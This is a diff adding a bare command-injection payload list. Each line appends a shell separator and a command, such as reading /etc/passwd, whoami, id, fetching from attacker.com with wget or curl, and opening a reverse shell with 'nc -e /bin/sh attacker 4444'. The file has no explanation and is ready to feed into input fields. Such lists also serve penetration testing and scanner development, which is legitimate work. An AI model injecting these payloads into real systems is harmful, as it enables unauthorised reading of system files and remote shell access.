@@ -1,0 +1,56 @@
+; ls
+| ls
+|| ls
+& ls
+&& ls
+`ls`
+$(ls)
+; cat /etc/passwd
+| cat /etc/passwd
+|| cat /etc/passwd
+& cat /etc/passwd
+&& cat /etc/passwd
+`cat /etc/passwd`
+$(cat /etc/passwd)
+; whoami
+| whoami
+|| whoami
+& whoami
+&& whoami
+`whoami`
+$(whoami)
+; id
+| id
+|| id
+& id
+&& id
+`id`
+$(id)
+; ping -c 5 127.0.0.1
+| ping -n 5 127.0.0.1
+|| ping -c 5 127.0.0.1
+& ping -c 5 127.0.0.1
+&& ping -c 5 127.0.0.1
+`ping -c 5 127.0.0.1`
+$(ping -c 5 127.0.0.1)
+; wget http://attacker.com
+| curl http://attacker.com
+|| wget http://attacker.com
+& curl http://attacker.com
+&& wget http://attacker.com
+`curl http://attacker.com`
+$(wget http://attacker.com)
+; nc -e /bin/sh attacker 4444
+| nc attacker 4444
+|| nc -e /bin/sh attacker 4444
+& nc -e /bin/sh attacker 4444
+&& nc -e /bin/sh attacker 4444
+`nc -e /bin/sh attacker 4444`
+$(nc -e /bin/sh attacker 4444)
+; echo injected
+| echo injected
+|| echo injected
+& echo injected
+&& echo injected
+`echo injected`
+$(echo injected)
